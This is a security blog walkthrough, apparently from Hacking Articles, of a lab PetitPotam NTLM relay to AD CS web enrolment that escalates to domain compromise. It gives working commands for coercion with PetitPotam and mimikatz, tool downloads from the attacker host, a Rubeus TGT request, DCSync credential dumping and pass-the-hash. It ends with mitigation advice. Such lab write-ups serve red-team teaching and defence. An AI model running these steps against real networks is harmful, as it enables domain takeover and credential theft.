@@ -1,0 +1,133 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/domain-escalation/" rel="category tag">Domain Escalation</a>, <a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/domain-escalation-petitpotam-ntlm-relay-to-adcs-endpoints/" rel="bookmark"><time class="entry-date published" datetime="2022-02-25T17:05:52+00:00">February 25, 2022</time><time class="updated" datetime="2025-06-23T19:50:55+00:00">June 23, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Will Schroeder and Lee Christensen wrote a research paper on this technique which can be referred to <strong><span style="color: #0000ff;">here</span></strong>. In ESC8 technique mentioned in the research paper, they talked about an inherent vulnerability in the web interface of CA server with web enrolment service on. An attacker can, therefore, relay the requests from the web interface to request the Domain Controller machine account’s (DC$) certificate and gain escalation+persistence. Lionel Gilles developed PetitPotam, a PoC tool that can coerce or persuade a Windows host to authenticate against DC, enabling the request of certificates and gaining escalation (found <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/topotam/PetitPotam">here</a></span></strong>).</span></p>
+<h3><span style="color: #800000;"> Table of content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Vulnerability</strong></span></li>
+<li><span style="color: #000000;"><strong>Architecture</strong></span></li>
+<li><span style="color: #000000;"><strong>Lab Setup</strong></span></li>
+<li><span style="color: #000000;"><strong>Attack Demonstration</strong></span></li>
+<li><span style="color: #000000;"><strong>Initial Compromise</strong></span></li>
+<li><span style="color: #000000;"><strong>Certificate Generation – PetitPotam Python script</strong></span></li>
+<li><span style="color: #000000;"><strong>Certificate Generation – PetitPotam.exe</strong></span></li>
+<li><span style="color: #000000;"><strong>Certificate Generation – Mimikatz</strong></span></li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">TGT generation</span></li>
+<li><span style="color: #000000;">DCSync attack</span></li>
+<li><span style="color: #000000;">PassTheHash attack</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
+<li><span style="color: #000000;"><strong>Conclusion</strong></span></li>
+</ul>
+<h3><span style="color: #000000;"><strong> </strong><span style="color: #800000;">Vulnerability</span></span></h3>
+<p><span style="color: #000000;">AD CS supports several HTTP-based enrollment methods via additional AD CS server roles that administrators can install. These enrolment interfaces are vulnerable to NTLM relay attacks. The web endpoints do not have NTLM relay protections enabled by default and hence, are vulnerable by default. Flow of the vulnerability is as follows:</span></p>
+<ul>
+<li><span style="color: #000000;">The attack coerces/forces a Domain Controller Machine Account (workstation01$ in our case) to authenticate towards our NTLM relay setup (Kali in our case).</span></li>
+<li><span style="color: #000000;">Workstation01$ account authentication request is forwarded to NTLM relay server (kali).</span></li>
+<li><span style="color: #000000;">Workstation01$ account authentication relayed to CA Server or ADCS (Active Directory Certificate Service).</span></li>
+<li><span style="color: #000000;">Generate Certificate</span></li>
+<li><span style="color: #000000;">Use the certificate to perform attacks (like DCSync) to compromise DC1$ (CA server)</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>How do we force authentication?</strong> =&gt; If an attacker is patient, he can wait for organic authentication. But we don’t have that much time so we need to force authentication. One such method is the famous “<span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.fortalicesolutions.com/posts/elevating-with-ntlmv1-and-the-printer-bug">Printer Bug</a></strong></span>.” But it depends on the print spooler service to be running and vulnerable. Therefore, Lionel Gilles created “PetitPotam” which initially leveraged the vulnerable EfsRpcOpenFileRaw function in MS-EFSR protocol that had an insufficient path check vulnerability. By using this, attackers can make forced/coerced authentications over SMB thus increasing NTLM relay’s capabilities. Since then, many newer functions have been added to the PetitPotam tool.</span></p>
+<h3><span style="color: #800000;">Architecture</span></h3>
+<p><span style="color: #000000;"><strong>CA server with Web Enrollment</strong> – <strong>DC1$:</strong> <strong>192.168.1.2</strong></span></p>
+<p><span style="color: #000000;"><strong>Domain Controller</strong> – <strong>workstation01$:</strong> <strong>192.168.1.3</strong></span></p>
+<p><span style="color: #000000;"><strong>Attacker Kali</strong> – <strong>Not in domain:</strong> <strong>192.168.1.4</strong></span></p>
+<p><span style="color: #000000;"><strong>Attacker Windows</strong> – <strong>Not in domain:</strong> <strong>random IP</strong> (non-domain joined but DNS pointing to CA IP)</span></p>
+<h3><span style="color: #800000;">Lab Setup</span></h3>
+<p><span style="color: #000000;">On the Windows Server where ADCS is already configured, go to the server manager and choose to add roles and features and add the following three roles:</span></p>
+<ul>
+<li><span style="color: #000000;">CA Web Enrolment</span></li>
+<li><span style="color: #000000;">Certificate Enrolment Web Service</span></li>
+<li><span style="color: #000000;">Network Device Enrolment Service</span></li>
+</ul>
+<p><span style="color: #000000;">As you can see, on my server (dc1.ignite.local) I have already installed these. I didn’t change any configuration and kept everything to default.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh_eIRCCKT5AQ5S6g2mmF60D9Uo3bG77PGBBFSOQ7FIWDP-1LV4ZAeNILvTYVAJzdl5lPoTfx07ihqG-JHqKXjgfst24nCwsCC5oeqk52QH8FoCuhT2O01F5PUYcE6KfXxFgF-7FT22545BPzLJNFGYkdGbgd-MIvonugp_MYuY7239gDudHeG58krqwQ=s16000"/></span></p>
+<p><span style="color: #000000;">We can start internet explorer and see on the following link if cert web enrolment is running or not.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://dc1.ignite.local/certsrv/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjveHqfeN7WcsXEVaGV5iPvlVmEXw4hJSKpqBt4h344C5-5gL-xPxAYiE_vjlohXinbYyZmhpi-lOtjOOMbOnEP2DtZ-sehtGxnMfQMNwUYkYBQ324ChLog22aYDr91Dye8plqu2ECHwOB0EOK_ZTWTuGK5xEjn8Bpc4VdqbUG4_S137j3019fQoWjoug=s16000"/></span></p>
+<p><span style="color: #000000;">And finally, you need to set up a separate DC account on a different machine as I have. In most of the scenarios, DC and CA servers are the same but just for the sake of simplicity, I have made them different. As you can see the DC machine has a DC account set up called “Workstation01” which is in the DC group.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjMs7dBLNd8Bjse-DqLzxAJ4O3FEvpt43kq7vYX1hc-J_LO0goObD6Ck7Mv_R4d5y5T_0pwGgZ2ye8MrWHQ45DA0wLlFGLH5tWx_9d1OoerTqmE-85E3sDhhl9ZNpDD0AE1cGGho-7-esOcN480mdUORpbDe_lAi61rcOSPqvSrFqHCZC_vZ0wRmDtFjg=s16000"/></span></p>
+<h3><span style="color: #800000;">Attack Demonstration</span></h3>
+<p><span style="color: #000000;">The demonstration is divided into 5 parts: Initial compromise, 3 methods to request CA, and Escalation.</span></p>
+<h3><span style="color: #800000;">Initial Compromise</span></h3>
+<p><span style="color: #000000;">Since this is a domain escalation attack, we first need access to the victim system. Here, I have compromised a computer that has a workstation01$ account on it. It is clear that this system has a DC machine account on it which means the system belongs to a DC but we do not have access to DC.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">net group “domain controllers” /domain</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjHLcIBujikTbawvz8BSA-eEfeatY-wD-lMWIkGDYUyrhfZSGqqe_c7HHAArFdslaMWDaLX4PqoOJULtwOqxCdMqGNhqFUH7MQj4QM3wwAruUEgE31Buz2u2xu6opkcFZfbu2PS9HkerWdGw7YxLvZ9VWycJJGnOzf5uTlhbzkqUIN2rMUP6zYNAY6dDg=s16000"/></span></p>
+<p><span style="color: #000000;"><strong>Our aim</strong>: generate DC certificate and authenticate CA server against it and escalate privileges to DC.</span></p>
+<p><span style="color: #000000;"><strong>Compromised Credentials: </strong>Harshit:Password@1</span></p>
+<p><span style="color: #000000;">Before we generate a certificate for this DC account, we need to set up our NTLM relay. We can do this using Impacket’s python script ntlmrelayx.py</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ntlmrelayx.py -t http://192.168.1.2/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjGrlg86Pgw_BUicyoS28frc43HC2y1eG-EOL64a3MH2OUbs3zhXHydmji0ujRzgydUmC-GKGNF17NdueKmuUA0f5xie5e2koJYvW7htmd1Xzo9hjQHRPdvH9r35YauotKQAW_bkvRypEmnD54_aj4-xs0ycnUq0LqdFw4F44eg5R7SuYQZJgLMe5NG2g=s16000"/></strong></span></p>
+<h3><span style="color: #800000;">Certificate Generation – PetitPotam Python script</span></h3>
+<p><span style="color: #000000;">PetitPotam can be downloaded from the official github repo <a style="color: #000000;" href="https://github.com/topotam/PetitPotam">here</a>. To run the script is quite easy, you just need to specify the domain, credentials of the compromised user and IP of NTLM relayer (kali) followed by IP of the DC</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/topotam/PetitPotam
+cd PetitPotam
+python3 PetitPotam.py -d ignite.local -u harshit -p Password@1 192.168.1.4 192.168.1.3</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjsOiGQQlc7_iXz9QSJiXrqWxZhJykCd5zdAdqrE5nPkGqd2CIFgYL5yIKO62GF0g8_xNXzP_giRAcwr2MsnHtnNQ-TlwuvxHADvG7tDHKctE3zLLtPPapF_wvuZEqF9aWP90ycOi5Se8k_tyu9vSeU2WLjpBixlYXtgNZcnSiWjV884CxdQiE8wG_85A=s16000"/></span></p>
+<p><span style="color: #000000;">If everything goes well, you would see a screenshot like above with the script stating Sending EfsRpcOpenFileRaw and Attack Successful!</span></p>
+<p><span style="color: #000000;">This should have generated the certificate for DC machine account Workstation01$ in the NTLM relay console. A few things to observe here are:</span></p>
+<ul>
+<li><span style="color: #000000;">Authentication succeeded: means that a low priv user provided authentication for a machine account (vulnerability in the Windows API for web enrolment) when Cert Web Enrol was called.</span></li>
+<li><span style="color: #000000;">Attack from 192.168.1.3 controlled, attacking target 192.168.1.2: means that the relay has now successfully forwarded the request to the CA server, and the system has generated a certificate for the DC account workstation01$.</span></li>
+</ul>
+<p><span style="color: #000000;">You can copy this certificate in a text file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjqjp5467OaJfvEqm0T5NZ04sI-IeBXOSjqwdvHlPk_g8tKPr7d19gJeaNAp0CMnv46VHeWCDqIz5MrOdjQK-dXoo78gh8yegXeM4Ct9G2nIx_qostLdVO-DbhloSUIDtn9sEuEiCJFhU1IpUVW6IixY-mcR4zJjk39-28ZC82_4AHV_NNQLDQwgDhpbw=s16000"/></span></p>
+<p><span style="color: #000000;">Before we move on to the actual priv ESC methods, I’d like to show you two more methods to do the same as what we did just now.</span></p>
+<h3><span style="color: #800000;">Certificate Generation – PetitPotam.exe</span></h3>
+<p><span style="color: #000000;">The official GitHub repo also comes with the PetitPotam.exe file. You can upload this file to the victim server and execute and get the same results. If you see a slight pause and then Attack success!!! Status, you have generated the DC account’s certificate. In the PetitPotam.exe command, “1” refers to the triggering of the exploit using default EfsRpcOpenFileRaw function vulnerability. There are other vulnerable functions added by the author too.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget 192.168.1.4/PetitPotam.exe -O PetitPotam.exe
+PetitPotam.exe 192.168.1.4 192.168.1.3 1</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgjDWLInv9WuN82aOnVr1xq-MtC5TKb88kR-BA9_hGy74I7_aUYI9BFZz4LesE-YhDejhNuQT05nYgJmYSAojdX_5nPTQHT5eLBztkYYGMVEDo9a6SFuv1s3NoPNqq5A-zNSlqg2X1HkRmS7hEkkllOIGdn-YZIyoH6GUGDlh_62L4qnoltTtfgyzmnig=s16000"/></span></p>
+<h3><span style="color: #800000;">Certificate Generation – Mimikatz</span></h3>
+<p><span style="color: #000000;">As people of culture, we like to add new exploits to our favourite mimikatz. EfsRpcOpenFileRaw function vulnerability can be triggered using mimikatz too. We just need to upload this to our victim’s server and execute the following command.</span></p>
+<p><span style="color: #000000;">/connect: NTLM relay IP</span></p>
+<p><span style="color: #000000;">/server: dc_account.domain.fqdn</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell wget http://192.168.1.4/mimikatz.exe -O mimikatz.exe
+misc::efs /server:workstation01.ignite.local /connect:192.168.1.4</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjSuAxDXsnax2ywjoMHavevMELZyahAU4bzPiq9kSZf5nBrzeNllEyfGlh-KMHYI_XKPejsJxA28hSQJfM2JERhxrKocIf2pup4bmGRlPnflP-T6txFM36I03JaxuclUA0gYXJwuNMAHalJrrTX-h6o3ond62CqgntsTvOPR1pfK6AOlJxsYEr47zjWlg=s16000"/></span></p>
+<p><span style="color: #000000;">All of the above methods shall yield the same certificate as result. Now, let’s escalate our privileges.</span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;"><strong>TGT generation</strong></span></p>
+<p><span style="color: #000000;">We need to take a new Windows 10 system that is not in the domain to demonstrate this practical. We set up a local admin account on this system and change our DNS to point to the DC like so:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj6S9txOEFeQr4K2PQKPcUSt9dcf8tSakgJ_A6b3ViciR2cS0N4ANdbx-X7ipAkOtlUJsRttrs4bUdBfIZyILhyq14UVkQ-KzzJvNhQjGvf7PRLK_2SzxhDqtcK9HF7O3cZorHPC_PI9Eqk-2cb96nySLII4iOOvkjxzll0yGDBdgioMpt1H5ckcT_Obw=s16000"/></span></p>
+<p><span style="color: #000000;">Now, since we have our DC certificate with us, we need to translate this into much more efficient means of access. Let’s generate a TGT using Rubeus first. Asktgt module in Rubeus can do that while taking the generated certificate as a command-line input. The command is as follows:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">.\Rubeus.exe asktgt /outfile:kirbi /dc:192.168.1.2 /domain:ignite.local /user:workstation01 /ptt /certificate:MIIRdQIBAz.....</pre>
+<p><span style="color: #000000;">Kirbi is a base64 encoded TGT format used by Rubeus.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhy3n-BVVLR8EwZ70UNHaeg8MwoH1xIFQ1cxVa0esX_VAhMznHHeqkUvkTQBly0L01d_ZImhEvhB2b4kdXy39vif02Akfd0hVVryBCPUX781QFxocEHI6M3PmY8fhZz0EogPLYT3pBGMw111IZwNiashdr-eRSB5oZNMKESxoG4UbyO9kOW-PhVQnLOoA=s16000"/></span></p>
+<p><span style="color: #000000;">As you can see with the klist command, a TGT has been created and saved in the system for further use.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjqS1Ln7afQ1jpNuxINQ7fAIyfmhYhlln8ivzpAXtGBlrru-u5qR2QgU7lvtDSvX2TvOKJYBhThzFLD50l2bppWKOpLOIZi4DlhDp8-YCjhyFYwkg0M5CHuyDYnUofqXKiOPVyI29Y6WwHd4VhYH69orFrDoPQqgyiKVLExxW3zuJw_RRUps19KWJx0BA=s16000"/></span></p>
+<p><span style="color: #800000;"><strong>DCSync Attack</strong></span></p>
+<p><span style="color: #000000;">Using mimikatz, we can leverage this ticket to conduct <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/credential-dumping-dcsync-attack/">DCSync</a> </strong></span>attack. First, let’s dump the krbtgt account’s hashes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lsadump::dcsync /domain:ignite.local /user:krbtgt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgmUbHqlJTtJl1OkQp79tVe29BJ1UEEJrkvVJDB6h9Q88aqndlwidhuvAwI3gmW15Vw3JGDxYrbgFBAIU9JgT-K0NvSWlET1rkv454LkRS3NfxuJAM2yXFahpBF7MFUR5pM8f4on2cOBK3MjP6QK-SnhQjkJKYekI8c4ojrWYQ9EmFvvTE7wEmUm-YczA=s16000"/></span></p>
+<p><span style="color: #000000;">Now, an attacker can use these credentials and SID provided to perform a Golden Ticket attack (for persistence). Details can be found <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/">here</a></strong></span>. But we are concerned with CA Server’s (DC1$ machine account) admin access at the moment. Let’s run DCSync one more time on the administrator account.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">lsadump::dcsync /domain:ignite.local /user:administrator</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgKCnXpZ9q1pCp2ckImKx22QvmXjrWPtEqlijePcn0i7dR6Y3rvlNcrOZ5JzpCu2h7QPVC3xpq1Pu1-J3b655MiOGQHxFAtPzLK0W8smKA77q6kaIkf43lCaTU9SOQPGFu5g-NdqcqrVbbbtueYuSIXsuFPICVog93UEwEjSaPl_yxD1ev_NDHdY7WE4Q=s16000"/></span></p>
+<p><span style="color: #000000;">As you can see, we have now obtained the NTLM hash of the Administrator account. Let us use psexec to gain a healthy shell now by conducting a PassTheHash attack.</span></p>
+<p><span style="color: #800000;"><strong>PassTheHash Attack</strong></span></p>
+<p><span style="color: #000000;">To conduct PassTheHash, we will use Impacket’s psexec.py implementation and the following command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">psexec.py -hashes :32196b56ffe6f45e294117b91a83bf38 ignite.local/administrator@192.168.1.2</pre>
+<p><span style="color: #000000;">And voila! That’s it. You can see that we have now compromised CA Server’s DC account (DC1$) just by leveraging the ADCS web enrolment vulnerability and creds of a low priv user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh2yriqioqqHWU7ekKxnMW4hlfJuTixo4x3ElJX40t4d2YAZlNL6iSWRAKvGVr87LxS5Ih0IVM2dwLAIyaV6lFtE1uqU7EQ6AAZE1UNWp2MwA-jbq_uy5eGtRYDgGMCv3ZtkPhFEaIh_LyLUNK2dACnHmeZGXW7oSUg6yazA-qKyAzSqX__984_elWZxQ=s16000"/></span></p>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<p><span style="color: #000000;">Microsoft has rolled out a detailed advisory on the necessary patching mechanism that you can <span style="box-sizing: border-box; margin: 0px; padding: 0px;">find <a href="https://support.microsoft.com/en-gb/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429" target="_blank" rel="noopener"><span style="color: #000000;">here</span></a></span>. But I’ll sum it up in short sentences here:</span></p>
+<ul>
+<li><span style="color: #000000;">Enable require SSL in the IIS manager-&gt;default sites-&gt;certsrv option</span></li>
+<li><span style="color: #000000;">Enable extended protection (under certsrv-&gt;authentication)</span></li>
+<li><span style="color: #000000;">Disable NTLM for IIS on ADCS server by setting certsrv-&gt;providers-&gt;negotiate:kerberos</span></li>
+</ul>
+<h3><span style="color: #800000;"> Conclusion</span></h3>
+<p><span style="color: #000000;">Certified-Pre Owned is a valuable white paper focusing on various ADCS vulnerabilities and through the means of our blog, we aim to create awareness about these attacks so that organisations can understand, implement and patch such unknown and unobserved weaknesses. Hope you liked the article. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
